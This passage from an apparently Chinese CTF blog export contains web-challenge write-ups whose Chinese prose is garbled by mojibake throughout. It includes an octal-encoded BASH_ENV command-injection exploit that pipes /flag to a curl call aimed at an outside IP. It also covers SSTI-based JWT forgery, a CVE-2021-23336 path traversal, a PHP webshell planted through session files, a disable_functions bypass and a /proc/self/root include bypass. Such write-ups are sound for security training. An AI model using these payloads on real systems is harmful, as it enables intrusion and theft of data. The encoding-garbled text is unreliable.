ï¼ŒæŠ“åŒ…è·å–step2æ›´æ”¹usernameï¼Œæ”¹å¯†æˆåŠŸï¼Œç™»å½•adminã€‚ æ¥ä¸‹æ¥å‘ç°ipé™åˆ¶ï¼ŒXFFå³å¯ï¼Œè¿›å…¥åå®¡æŸ¥å…ƒç´ å‘ç°æç¤ºï¼š 1index.php?module=filemanage&amp;do=??? çŒœæµ‹doçš„å†…å®¹ä¸ºuploadï¼Œè®¿é—®åå‡ºç°æ–‡ä»¶ä¸Šä¼ ï¼Œç®€å•çš„uploadç»•è¿‡ï¼Œç”¨.php5ç»•è¿‡åç¼€æ£€æµ‹ï¼Œjsæ ‡ç­¾ç»•è¿‡phpæ ‡ç­¾æ£€æµ‹ï¼Œä¸Šä¼ æˆåŠŸå³å¯è·å–flagã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"ã€LineCTF2022ã€‘éƒ¨åˆ†é¢˜ç›®å¤ç°","slug":"ã€LineCTF2022ã€‘éƒ¨åˆ†é¢˜ç›®å¤ç°","date":"2022-04-17T08:08:13.000Z","updated":"2022-04-19T03:24:51.250Z","comments":true,"path":"2022/04/17/ã€LineCTF2022ã€‘éƒ¨åˆ†é¢˜ç›®å¤ç°/","link":"","permalink":"http://example.com/2022/04/17/%E3%80%90LineCTF2022%E3%80%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","excerpt":"å‰è¨€ é½å®‰ä¿¡çš„æ¯”èµ›ï¼Œå½“æ—¶éƒ½æ²¡å‘ç°æœ‰è¿™æ¯”èµ›ï¼Œç°åœ¨æœ‰ç¯å¢ƒäº†æ¥å°è¯•å¤ç°ä¸‹ã€‚","text":"å‰è¨€ é½å®‰ä¿¡çš„æ¯”èµ›ï¼Œå½“æ—¶éƒ½æ²¡å‘ç°æœ‰è¿™æ¯”èµ›ï¼Œç°åœ¨æœ‰ç¯å¢ƒäº†æ¥å°è¯•å¤ç°ä¸‹ã€‚ BBå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324 &lt;?php error_reporting(0); function bye($s, $ptn)&#123; if(preg_match($ptn, $s))&#123; return false; &#125; return true; &#125; foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123; if(bye($k, &quot;/=/i&quot;) &amp;&amp; bye($v, &quot;/[a-zA-Z]/i&quot;)) &#123; putenv(&quot;&#123;$k&#125;=&#123;$v&#125;&quot;); &#125; &#125; system(&quot;bash -c &#x27;imdude&#x27;&quot;); foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123; if(bye($k, &quot;/=/i&quot;)) &#123; putenv(&quot;&#123;$k&#125;&quot;); &#125; &#125; highlight_file(__FILE__);?&gt; å¤æ‚çš„ä»£ç å®¡è®¡å¾€å¾€åªéœ€è¦å‡ è¡Œæœ´å®æ— åçš„ä»£ç ï¼Œæ¯”å¦‚è¿™æ®µä»£ç ã€‚æˆ‘ä»¬å‘ç°æˆ‘ä»¬èƒ½ä¼ å…¥çš„åªæœ‰envå‚æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªå‚æ•°è¿˜ä¸èƒ½æœ‰å­—æ¯ã€‚è¿™ä¸ªåœ°æ–¹å°è¯•ç”¨å…«è¿›åˆ¶ç»•è¿‡(whoami)ï¼š æ¥ç€çœ‹è¿™æ®µä»£ç ï¼Œä¹Ÿååˆ†çœ¼ç†Ÿå•Šï¼Œç›´æ¥æƒ³åˆ°pç‰›ä¸ä¹…å‰å†™çš„æ–‡ç« ï¼šæˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ–‡ç« è¯¦ç»†å‰–æäº†åŸç†ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆç›´æ¥è¿ç”¨BASH_ENVå¯¼è‡´çš„å‘½ä»¤æ³¨å…¥ï¼Œç¤ºä¾‹ï¼š æˆåŠŸæ‰“å°äº†imdudeï¼Œè¯´æ˜æ³¨å…¥ç‚¹å­˜åœ¨ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨curlåå¼¹shellï¼Œexpï¼š 123456789101112131415import stringimport requestscmd = &#x27;cat /flag | curl -d @- xx.xx.xx.xx:2333&#x27;o = &#x27;&#x27;for c in cmd: if c in string.ascii_letters: o += f&quot;$&#x27;\\\\&#123;oct(ord(c))[2:]&#125;&#x27;&quot; #è½¬å…«è¿›åˆ¶ else: o += cr = requests.get(f&#x27;http://caa49c7e-c032-4246-9864-b4df0d75fbbc.node4.buuoj.cn:81/?env[BASH_ENV]=`&#123;o&#125;`&#x27;)print(r.text) ç›‘å¬2333ç«¯å£ï¼Œè¿è¡Œexpè·å–flagã€‚ gotmè¿›å…¥ç¯å¢ƒä¸€çœ‹ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå¤ªçˆ±äº†ï¼Œä¸è¿‡ç»™äº†é™„ä»¶ï¼Œçœ‹äº†ä¸€ä¸‹æ˜¯ç”¨goè¯­è¨€å†™çš„ï¼Œå…³é”®éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495func auth_handler(w http.ResponseWriter, r *http.Request) &#123; uid := r.FormValue(&quot;id&quot;) upw := r.FormValue(&quot;pw&quot;) if uid == &quot;&quot; || upw == &quot;&quot; &#123; return &#125; if len(acc) &gt; 1024 &#123; clear_account() &#125; user_acc := get_account(uid) if user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123; token, err := jwt_encode(user_acc.id, user_acc.is_admin) if err != nil &#123; return &#125; p := TokenResp&#123;true, token&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return &#125; w.WriteHeader(http.StatusForbidden) return&#125;func regist_handler(w http.ResponseWriter, r *http.Request) &#123; uid := r.FormValue(&quot;id&quot;) upw := r.FormValue(&quot;pw&quot;) if uid == &quot;&quot; || upw == &quot;&quot; &#123; return &#125; if get_account(uid).id != &quot;&quot; &#123; w.WriteHeader(http.StatusForbidden) return &#125; if len(acc) &gt; 4 &#123; clear_account() &#125; new_acc := Account&#123;uid, upw, false, secret_key&#125; acc = append(acc, new_acc) p := Resp&#123;true, &quot;&quot;&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return&#125;func flag_handler(w http.ResponseWriter, r *http.Request) &#123; token := r.Header.Get(&quot;X-Token&quot;) if token != &quot;&quot; &#123; id, is_admin := jwt_decode(token) if is_admin == true &#123; p := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125; res, err := json.Marshal(p) if err != nil &#123; &#125; w.Write(res) return &#125; else &#123; w.WriteHeader(http.StatusForbidden) return &#125; &#125;&#125;func root_handler(w http.ResponseWriter, r *http.Request) &#123; token := r.Header.Get(&quot;X-Token&quot;) if token != &quot;&quot; &#123; id, _ := jwt_decode(token) acc := get_account(id) tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id) if err != nil &#123; &#125; tpl.Execute(w, &amp;acc) &#125; else &#123; return &#125;&#125;func main() &#123; admin := Account&#123;admin_id, admin_pw, true, secret_key&#125; acc = append(acc, admin) http.HandleFunc(&quot;/&quot;, root_handler) http.HandleFunc(&quot;/auth&quot;, auth_handler) http.HandleFunc(&quot;/flag&quot;, flag_handler) http.HandleFunc(&quot;/regist&quot;, regist_handler) log.Fatal(http.ListenAndServe(&quot;0.0.0.0:11000&quot;, nil))&#125; æˆ‘ä»¬æ€»å…±æœ‰å››ä¸ªè·¯ç”±ï¼Œä¸Šé¢çš„å‡½æ•°åˆ†åˆ«å¯¹åº”äº†å››ä¸ªè·¯ç”±çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æœ€åè¦åœ¨/flagä¸­è·å–flagï¼Œå¿…é¡»æ»¡è¶³is_admin == trueï¼Œé‚£ä¹ˆå°±è¦æ±‚æˆ‘ä»¬å¿…é¡»ä¼ å…¥ä¸€ä¸ªæ­£ç¡®çš„X-Tokenã€‚ è€Œåœ¨/è·¯ç”±çš„å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°goè¯­è¨€çš„sstiï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä»¤accï¼Œå³idçš„å€¼ä¸º&#123;&#123;.&#125;&#125;ï¼Œå°±å¯ä»¥å¾—åˆ°secert_keyçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ä¼ªé€ jwtäº†ã€‚ é¦–å…ˆæˆ‘ä»¬æ ¹æ®/registè·¯ç”±çš„å†…å®¹æ³¨å†Œè´¦å·ï¼š 1/regist?id=&#123;&#123;.&#125;&#125;&amp;pw=123 æ¥ç€æ ¹æ®/authè·¯ç”±å†…å®¹ç™»å½•è·å–ä¸€ä¸ªtokenï¼Œè¿™ä¸ªtokençš„is_adminéƒ¨åˆ†æ˜¯falseï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯æ ¹æ®å‰é¢çš„sstiï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®/è·¯ç”±è·å–secret_keyï¼š 12345/auth?id=&#123;&#123;.&#125;&#125;&amp;pw=123return:&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss&quot;&#125;å¸¦ä¸Štokenè®¿é—®/returnï¼šLogged in as &#123;&#123;&#123;.&#125;&#125; 123 false this_is_f4Ke_key&#125; è·å–åˆ°secret_keyçš„å€¼ä¸ºthis_is_f4Ke_keyï¼Œçœ‹èµ·æ¥è¿˜å¾ˆæœ‰è¿·æƒ‘æ€§ï¼Œæ¥ä¸‹æ¥ä¼ªé€ jwtï¼š å¸¦ä¸Šä¼ªé€ çš„tokenè®¿é—®/flagè·¯ç”±ï¼Œè·å–flagã€‚ Memo Driverè¿›å…¥é¡µé¢çœ‹èµ·æ¥åƒæ˜¯ä¸ªç•™è¨€æ¿ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¯ä»¥å†™ä¸œè¥¿ç„¶åä¿å­˜ï¼Œå†è¿›å…¥/viewè·¯ç”±æŸ¥çœ‹ï¼ŒåŠŸèƒ½å¤§æ¦‚è¿™ä¹ˆå¤šã€‚ ç„¶åä¸‹è½½é™„ä»¶æŸ¥çœ‹æºç ï¼Œå¥½å®¶ä¼™pythonå†™çš„ï¼Œè¿™ä¸‰é¢˜ç”¨äº†ä¸‰ä¸ªè¯­è¨€å†™ç½‘é¡µï¼Œå¤ªç»äº†ã€‚æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import osimport hashlibimport shutilimport datetimeimport uvicornimport loggingfrom urllib.parse import unquotefrom starlette.applications import Starlettefrom starlette.responses import HTMLResponsefrom starlette.routing import Route, Mountfrom starlette.templating import Jinja2Templatesfrom starlette.staticfiles import StaticFileslogger = logging.getLogger()logger.setLevel(logging.DEBUG)templates = Jinja2Templates(directory=&#x27;./&#x27;)templates.env.autoescape = Falsedef index(request): context = &#123;&#125; memoList = [] try: clientId = getClientID(request.client.host) path = &#x27;./memo/&#x27; + clientId if os.path.exists(path): memoList = os.listdir(path) context[&#x27;request&#x27;] = request context[&#x27;ip&#x27;] = request.client.host context[&#x27;clientId&#x27;] = clientId context[&#x27;memoList&#x27;] = memoList context[&#x27;count&#x27;] = len(memoList) except: pass return templates.TemplateResponse(&#x27;/view/index.html&#x27;, context)def save(request): context = &#123;&#125; memoList = [] try: context[&#x27;request&#x27;] = request context[&#x27;ip&#x27;] = request.client.host contents = request.query_params[&#x27;contents&#x27;] path = &#x27;./memo/&#x27; + getClientID(request.client.host) + &#x27;/&#x27; if os.path.exists(path) == False: os.makedirs(path, exist_ok=True) memoList = os.listdir(path) idx = len(memoList) if idx &gt;= 3: return HTMLResponse(&#x27;Memo Full&#x27;) elif len(contents) &gt; 100: return HTMLResponse(&#x27;Contents Size Error (MAX:100)&#x27;) filename = str(idx) + &#x27;_&#x27; + datetime.datetime.now().strftime(&#x27;%Y%m%d%H%M%S&#x27;) f = open(path + filename, &#x27;w&#x27;) f.write(contents) f.close() except: pass return HTMLResponse(&#x27;Save Complete&#x27;)def reset(request): context = &#123;&#125; try: context[&#x27;request&#x27;] = request clientId = getClientID(request.client.host) path = &#x27;./memo/&#x27; + clientId if os.path.exists(path) == False: return HTMLResponse(&#x27;Memo Null&#x27;) shutil.rmtree(path) except: pass return HTMLResponse(&#x27;Reset Complete&#x27;)def view(request): context = &#123;&#125; try: context[&#x27;request&#x27;] = request clientId = getClientID(request.client.host) if &#x27;&amp;&#x27; in request.url.query or &#x27;.&#x27; in request.url.query or &#x27;.&#x27; in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] path = &#x27;./memo/&#x27; + &quot;&quot;.join(request.query_params.keys()) + &#x27;/&#x27; + filename f = open(path, &#x27;r&#x27;) contents = f.readlines() f.close() context[&#x27;filename&#x27;] = filename context[&#x27;contents&#x27;] = contents except: pass return templates.TemplateResponse(&#x27;/view/view.html&#x27;, context)def getClientID(ip): key = ip + &#x27;_&#x27; + os.getenv(&#x27;SALT&#x27;) return hashlib.md5(key.encode(&#x27;utf-8&#x27;)).hexdigest()routes = [ Route(&#x27;/&#x27;, endpoint=index), Route(&#x27;/view&#x27;, endpoint=view), Route(&#x27;/reset&#x27;, endpoint=reset), Route(&#x27;/save&#x27;, endpoint=save), Mount(&#x27;/static&#x27;, StaticFiles(directory=&#x27;./static&#x27;), name=&#x27;static&#x27;)]app = Starlette(debug=False, routes=routes)if __name__ == &quot;__main__&quot;: logging.info(&quot;Starting Starlette Server&quot;) uvicorn.run(app, host=&quot;0.0.0.0&quot;, port=11000) å››ä¸ªè·¯ç”±åˆ†åˆ«å¯¹åº”äº†ä¹‹å‰ç½‘é¡µçš„å››ä¸ªåŠŸèƒ½ï¼Œæ¥ä¸‹æ¥æœ€é‡è¦çš„æ˜¯å°±æ˜¯æ‰¾rceæˆ–æ–‡ä»¶è¯»å–çš„ç‚¹ï¼Œå‘ç°åœ¨/viewè·¯ç”±ä¸­å­˜åœ¨æ–‡ä»¶è¯»å–ï¼š 123f = open(path, &#x27;r&#x27;)contents = f.readlines()f.close() é‚£ä¹ˆæˆ‘ä»¬å°±è¦å°†pathè¯»åˆ°flagï¼Œé‚£é‡ç‚¹è¿˜æ˜¯åœ¨è¿™ä¸ª/viewè·¯ç”±ä¸­ï¼Œåˆ†æå‡½æ•°ï¼Œå‘ç°ä¸èƒ½å­˜åœ¨.å’Œ&amp;ã€‚ä¸è¿‡ç”±äºé¢˜ç›®çš„pythonæ˜¯3.9.0çš„ï¼Œå› æ­¤å­˜åœ¨CVE-2021-23336æ¼æ´ï¼Œè¿™ä¸ªCVEä¼šæŠŠ;ç•¶ä½œ&amp;ã€‚ è¿™æ ·çš„è¯ï¼Œåˆ©ç”¨query_paramsçš„é”™è¯¯è§£æï¼Œå½“valueä»¥;åˆ†å‰²åï¼Œquery_paramsä¼šæˆªå–;å‰åŠéƒ¨åˆ†ï¼Œè€Œquery_params.keys()ä¼šå°†keyå’Œa;åé¢çš„b,cå½“ä½œkeyã€‚ é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ„å»ºè¿™æ ·çš„payloadï¼š 1/view?id=flag;/.. request.urlç›´æ¥raw URLï¼Œæ²’æœ‰è¿›è¡Œdecodeï¼Œç„¶årequest.url.queryä¹Ÿæ˜¯æ²’æœ‰decodeï¼Œä¹‹ååˆ°äº†request.query_paramsçš„è¢«è§£ææˆä¸¤ä¸ªparams: 12id=flag/..= è€Œæœ€ååœ¨request.query_params.keys()çš„æ™‚å€™è¢«decodeï¼Œç»“åˆèµ·æ¥çš„pathå°±å˜æˆäº†ï¼š 1./memo/id/../flag flagåœ¨./memo/flagè¿™æ ·å°±æˆåŠŸè¯»å–åˆ°äº†flagã€‚ åæ¥çœ‹äº†å¦ä¸€ä¸ªå¤§ä½¬çš„wpï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªæ›´ç¥å¥‡çš„æ“ä½œå¯ä»¥æ„é€ pathï¼Œåˆ©ç”¨åˆ°çš„æ˜¯Host headerï¼Œpayloadæ˜¯è¿™æ ·æ„å»ºçš„ï¼š 1#/view?id=flag&amp;/.. è¿™æ ·payloadä¼ å…¥åï¼Œrequest.url.queryå®Œå…¨æ˜¯ç©ºçš„ï¼Œä½†æ˜¯request.query_paramsä¾ç„¶å­˜åœ¨ï¼Œå› æ­¤æ£€æŸ¥å°±è¢«ç»•è¿‡ï¼Œè¾¾åˆ°ç»•è¿‡çš„æ•ˆæœã€‚ è¿™ç§æ–¹æ³•çš„åŸç†å¤§æ¦‚å°±æ˜¯ï¼Œrequest.urlæ˜¯ä»Host headeræ„é€ è€Œæ¥çš„ï¼ŒHoståå¦‚æœåŠ äº†ä¸ª#ï¼Œä¹‹åçš„éƒ¨åˆ†éƒ½è¢«å½“æˆfragmentæ¥è§£æï¼Œè€Œä¸æ˜¯ query stringï¼Œæ‰€ä»¥request.url.queryç½®ç©ºäº†ã€‚è€Œrequest.query_paramsæ˜¯ç›´æ¥æ‹¿æœ€åŸå§‹çš„query stringï¼Œå› æ­¤è¢«ä¿ç•™äº†ã€‚ pathæ„é€ å‡ºæ¥ä»æ˜¯./memo/id/../flagï¼Œä¸è¿‡æˆ‘åœ¨buuæ²¡æœ‰è¿™ä¸ªæ–¹æ³•å¤ç°æˆåŠŸï¼Œå¯èƒ½æ˜¯å¹³å°è§£æçš„é—®é¢˜ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buuç»ƒä¹ 8","slug":"buuç»ƒä¹ 8","date":"2022-04-16T07:51:06.000Z","updated":"2022-04-16T11:55:04.613Z","comments":true,"path":"2022/04/16/buuç»ƒä¹ 8/","link":"","permalink":"http://example.com/2022/04/16/buu%E7%BB%83%E4%B9%A08/","excerpt":"å‰è¨€ å…»å¥½çŠ¶æ€å‡†å¤‡æ‰“MRCTFå’ŒISCCï¼Œç»§ç»­åˆ·é¢˜","text":"å‰è¨€ å…»å¥½çŠ¶æ€å‡†å¤‡æ‰“MRCTFå’ŒISCCï¼Œç»§ç»­åˆ·é¢˜ [GYCTF2020]EasyThinkingæ ¹æ®é¢˜ç›®åˆ¤æ–­æœ¬é¢˜è¦åˆ©ç”¨åˆ°ThinkingPHPçš„æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¿›å…¥ç½‘é¡µå…ˆéšä¾¿è¿›å…¥ä¸ªä¸å­˜åœ¨çš„è·¯ç”±ï¼Œè·å¾—ç‰ˆæœ¬ä¸ºThinkPHP V6.0.0ã€‚ä¿¡æ¯æœé›†å‘ç°å­˜åœ¨www.zipæºç æ³„éœ²ã€‚ æ¥ç€å»æ‰¾å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ï¼Œå‘ç°ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´å’Œä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ï¼Œé€šè¿‡å¯¹æ¯”æºç ä»¥åŠç‰ˆæœ¬åˆ¤æ–­æœ¬é¢˜åº”è¯¥æ˜¯ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ï¼Œå‚è€ƒæ–‡ç« ï¼šThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´çš„ç¤ºä¾‹åˆ†æ æˆ‘ä»¬ç¿»é˜…vendor/topthink/framework/src/think/session/driver/File.phpï¼Œå‘ç°æ–‡ä»¶é©±åŠ¨éƒ¨åˆ†ä»£ç ï¼š 123456789101112public function __construct(App $app, array $config = [])&#123; $this-&gt;config = array_merge($this-&gt;config, $config); if (empty($this-&gt;config[&#x27;path&#x27;])) &#123; $this-&gt;config[&#x27;path&#x27;] = $app-&gt;getRootPath() . &#x27;runtime&#x27; . DIRECTORY_SEPARATOR . &#x27;session&#x27; . DIRECTORY_SEPARATOR; &#125; elseif (substr($this-&gt;config[&#x27;path&#x27;], -1) != DIRECTORY_SEPARATOR) &#123; $this-&gt;config[&#x27;path&#x27;] .= DIRECTORY_SEPARATOR; &#125; $this-&gt;init();&#125; æ–‡ä»¶ä¿å­˜åœ¨/runtime/sessionä¸­ã€‚æ¥ä¸‹æ¥å®¡è®¡å„ä¸ªè·¯ç”±çš„åŠŸèƒ½ï¼Œå‘ç°app/home/controller/Member.phpä¸­å­˜åœ¨çš„searchå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930public function search() &#123; if (Request::isPost())&#123; if (!session(&#x27;?UID&#x27;)) &#123; return redirect(&#x27;/home/member/login&#x27;); &#125; $data = input(&quot;post.&quot;); $record = session(&quot;Record&quot;); if (!session(&quot;Record&quot;)) &#123; session(&quot;Record&quot;,$data[&quot;key&quot;]); &#125; else &#123; $recordArr = explode(&quot;,&quot;,$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3)&#123; array_shift($recordArr); session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125; &#125; session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125;else&#123; return View(&quot;search&quot;); &#125; &#125; searchå‡½æ•°ä¼šæŠŠæœç´¢æ¡†POSTæ•°æ®å­˜åˆ°sessionæ–‡ä»¶é‡Œé¢ï¼Œç”Ÿæˆçš„sessionæ–‡ä»¶åè§„åˆ™å³ä¸ºsess_PHPSESSIDã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ³¨å†Œè´¦å·å¹¶ç™»å½•ï¼Œåœ¨æœç´¢æ—¶è¿›è¡ŒæŠ“åŒ…ï¼Œå†™å…¥ä¸€å¥é©¬ï¼Œå°†PHPSESSIDæ”¹ä¸º32ä½çš„phpæ–‡ä»¶åï¼Œkeyå€¼ä¸ºå†™å…¥å†…å®¹ï¼š æŸ¥çœ‹runtime/session/sess_1234567890123456789012345678.phpï¼Œå‘ç°å†™å…¥æˆåŠŸï¼ŒæŸ¥çœ‹disable_functionsï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦ç”¨ã€‚ é‚£ä¹ˆæˆ‘ä»¬å…ˆå†å†™å…¥ä¸€ä¸ªä¸€å¥é©¬ï¼Œæ¥ç€å»githubä¸Šä¸‹è½½ä¸€ä¸ªexploit.phpè¿™ä¸ªpocï¼Œå°†11è¡Œæ”¹ä¸ºpwn(/readflag)ï¼Œä¸Šä¼ åˆ°/var/tmpä¸­ã€‚æ¥ç€ç”¨ä¸Šé¢çš„æ–¹æ³•ç»§ç»­å†™å…¥æ–‡ä»¶ä½¿å¾—è¿™ä¸ªpocè¢«åŒ…å«ï¼škey=&lt;?php include(&#39;/var/tmp/exploit.php&#39;);?&gt; æœ€åè¿”å›sess_1234567890123456789012345678.phpï¼Œè·å¾—flagã€‚ [FireshellCTF2020]Caasè¿›å…¥ç½‘é¡µï¼Œå‘ç°è¦æˆ‘ä»¬è¾“å…¥å†…å®¹è¿›è¡Œç¼–è¯‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆéšä¾¿è¾“å…¥ç‚¹phpä»£ç ï¼Œå‘ç°ä»–ä¸èƒ½è¯†åˆ«è¿™ä¸ªä»£ç ï¼Œé‚£ä¹ˆè¿™å°±ä¸æ˜¯phpç¼–è¯‘å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œå„ç§å°è¯•ã€‚ æœ€åå‘ç°cè¯­è¨€æˆåŠŸç¼–è¯‘ï¼Œå¹¶ä¸”ç”Ÿæˆäº†ELFæ–‡ä»¶ï¼Œå¹¶ä¸”æˆåŠŸè¾“å‡ºäº†hello worldã€‚å•Šè¿™ä¸æ˜¯webé¢˜å—ï¼Œä¸ºå•¥ä½¿ç”¨çš„æ˜¯cè¯­è¨€å•Šï¼Œéš¾ä¸æˆæˆ‘è¿˜å¾—å»åˆ©ç”¨cçš„æ¼æ´ï¼Ÿ å°è¯•è°ƒç”¨shellè¯»å–flagï¼Œæ— æœï¼Œé‚£ä¹ˆå°è¯•æ–‡ä»¶åŒ…å«ï¼š 1#include &quot;/etc/passwd&quot; å‘ç°æ–‡ä»¶æˆåŠŸè¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯»å–/flagï¼ŒæˆåŠŸå¾—åˆ°flagã€‚ [WMCTF2020]Make PHP Great Againå®¡è®¡ä»£ç  123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123; require_once $_GET[&#x27;file&#x27;];&#125; è¿™é¢˜çš„ä»£ç å¾ˆçœ¼ç†Ÿï¼Œå°±æ„Ÿè§‰æˆ‘åœ¨å“ªé‡Œè§è¿‡ç±»ä¼¼çš„ï¼Œåæ¥ç¿»äº†ç¿»æˆ‘æœ€è¿‘çš„è®°å½•ï¼Œå‘ç°è¿™ä¸æ˜¯pç‰›å»å¹´å†™çš„ä½¿ç”¨å¤šçº§è½¯è¿æ¥ç»•è¿‡æ–‡ä»¶åˆ¤æ–­å—ï¼Œæˆ‘ä»¬å°±ç”¨è¿™ä¸ªæ–¹æ³•æ¥ç»•è¿‡ã€‚ ç®€å•ä»‹ç»ä¸‹è¿™ä¸ªtrickï¼Œå°±æ˜¯æ­£å¸¸æƒ…å†µä¸‹phpä¼šå°†ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åè¿›è¡Œresolveï¼Œè½¬åŒ–æˆç»å¯¹è·¯å¾„ï¼Œè¿™æ—¶../ã€./éƒ½ä¼šè¿›è¡Œè®¡ç®—ï¼Œä½†å¦‚æœè½¯è¿æ¥è·³è½¬æ¬¡æ•°è¾¾åˆ°ä¸€ä¸ªä¸Šé™ï¼Œé‚£ä¹ˆlinuxçš„lstatå‡½æ•°å°±ä¼šå‡ºé”™ï¼Œå¯¼è‡´phpè®¡ç®—å‡ºçš„ç»å¯¹è·¯å¾„å’ŒåŸå§‹è·¯å¾„ä¸åŒï¼Œä»è€Œç»•è¿‡require_onceã€‚ linuxä¸‹æœ€å¸¸ç”¨çš„è½¯è¿æ¥å°±æ˜¯/proc/self/rootï¼Œè¿™ä¸ªè·¯å¾„æŒ‡å‘æ ¹ç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php è§£ç base64å¾—åˆ°flagã€‚ [HITCON 2017]SSRFmeå®¡è®¡æºç ï¼š 12345678910111213141516171819&lt;?php if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]); $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); é¦–å…ˆä»£ç åˆ›å»ºäº†ä¸ªsandboxæ–‡ä»¶å¤¹ï¼Œè·¯å¾„ä¸ºsandbox/åŠ ä¸ŠMD5åŠ å¯†è¿‡åçš„orangeåŠ é¡µé¢è¾“å‡ºçš„ipã€‚ æ¥ç€æ˜¯å…³é”®éƒ¨åˆ†ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£pealå‡½æ•°ä¸­getå‘½ä»¤æ¼æ´ï¼š perlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ  